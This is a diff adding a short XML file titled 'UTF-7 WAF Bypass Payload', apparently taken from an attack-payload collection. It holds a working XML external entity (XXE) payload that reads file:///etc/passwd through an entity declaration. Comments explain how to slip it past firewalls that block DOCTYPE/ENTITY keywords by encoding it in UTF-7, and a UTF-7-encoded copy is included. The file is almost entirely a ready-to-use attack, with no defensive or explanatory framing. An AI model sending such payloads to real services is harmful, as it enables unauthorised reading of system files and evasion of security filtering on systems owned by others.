@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- UTF-7 WAF Bypass Payload -->
+<!-- Use: When WAF blocks DOCTYPE/ENTITY keywords -->
+<!-- Convert this payload to UTF-7 encoding before sending -->
+<!-- Original payload that should be UTF-7 encoded: -->
+<!-- <?xml version="1.0" encoding="UTF-7"?> -->
+<!-- +ADwAIQ-DOCTYPE root +AFs- -->
+<!--   +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI- +AD4- -->
+<!-- +AF0APg- -->
+<!-- +ADw-root+AD4AJg-xxe;+ADw-/root+AD4- -->
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
